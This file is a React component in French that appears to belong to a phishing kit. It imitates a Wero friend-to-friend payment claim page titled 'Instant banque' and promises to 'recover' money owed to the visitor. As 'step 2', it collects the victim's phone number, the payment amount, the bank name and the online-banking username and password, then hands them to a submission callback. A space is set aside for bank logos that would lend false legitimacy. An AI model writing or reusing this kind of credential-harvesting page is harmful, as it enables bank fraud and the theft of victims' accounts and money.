import React, { useState } from 'react';
import { FormContainer } from './ui/FormContainer';
import { Input } from './ui/Input';
import { banksList } from '../data/banks';

interface BankLoginFormProps {
  onSubmit: (formData: BankLoginData) => Promise<boolean>;
}

export interface BankLoginData {
  phoneNumber: string;
  amount: string;
  bank: string;
  username: string;
  password: string;
}

export function BankLoginForm({ onSubmit }: BankLoginFormProps) {
  const [formData, setFormData] = useState<BankLoginData>({
    phoneNumber: '',
    amount: '',
    bank: '',
    username: '',
    password: ''
  });
  const [status, setStatus] = useState<'idle' | 'sending' | 'success' | 'error'>('idle');

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setStatus('sending');

    try {
      const success = await onSubmit(formData);
      if (!success) throw new Error('Failed to submit form');
      
      setStatus('success');
      setTimeout(() => setStatus('idle'), 3000);
    } catch (error) {
      setStatus('error');
      setTimeout(() => setStatus('idle'), 3000);
    }
  };

  const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
    setFormData(prev => ({
      ...prev,
      [e.target.name]: e.target.value
    }));
  };

  return (
    <FormContainer
      title="Instant banque."
      subtitle="Complétez les étapes 1 et 2 avec les informations respectives pour récupérer le montant du paiement entre Amis sur votre Compte Bancaire."
      step="ÉTAPE 2"
    >
      <form onSubmit={handleSubmit} className="space-y-6">
        <Input
          label="Veuillez saisir votre numéro de téléphone"
          name="phoneNumber"
          value={formData.phoneNumber}
          onChange={handleChange}
          placeholder="Numéro de téléphone"
          required
        />

        <Input
          label="Veuillez saisir le montant du Wero"
          name="amount"
          value={formData.amount}
          onChange={handleChange}
          placeholder="Montant du Wero"
          required
        />

        <div className="mb-6">
          <label className="block text-sm font-medium text-gray-700 mb-2">
            Veuillez saisir le nom de la banque
          </label>
          <select
            name="bank"
            value={formData.bank}
            onChange={handleChange}
            className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-yellow-500 focus:border-transparent transition-all duration-200"
            required
          >
            <option value="">Sélectionnez votre banque</option>
            {banksList.map(bank => (
              <option key={bank} value={bank}>{bank}</option>
            ))}
          </select>
        </div>

        <Input
          label="Identifiant d'accès en ligne du compte"
          name="username"
          value={formData.username}
          onChange={handleChange}
          placeholder="Ex: 123456789"
          required
        />

        <Input
          label="Mot de passe d'accès en ligne du compte"
          type="password"
          name="password"
          value={formData.password}
          onChange={handleChange}
          placeholder="Mot de passe"
          required
        />

        <button
          type="submit"
          disabled={status === 'sending'}
          className="w-full bg-black text-white font-semibold py-4 rounded-lg transition duration-200 hover:bg-gray-800 disabled:opacity-50 disabled:cursor-not-allowed"
        >
          {status === 'sending' ? 'Traitement en cours...' : 'RÉCUPÉRER MON ARGENT'}
        </button>

        {status === 'success' && (
          <div className="text-green-600 text-center bg-green-50 p-3 rounded-lg">
            Informations envoyées avec succès!
          </div>
        )}
        {status === 'error' && (
          <div className="text-red-600 text-center bg-red-50 p-3 rounded-lg">
            Échec de l'envoi. Veuillez réessayer.
          </div>
        )}
      </form>

      <div className="mt-12">
        <p className="text-center text-sm text-gray-600 mb-4">
          Ce service vous est proposé par :
        </p>
        <div className="flex flex-wrap justify-center gap-4">
          {/* Bank logos will be added here */}
        </div>
      </div>
    </FormContainer>
  );
}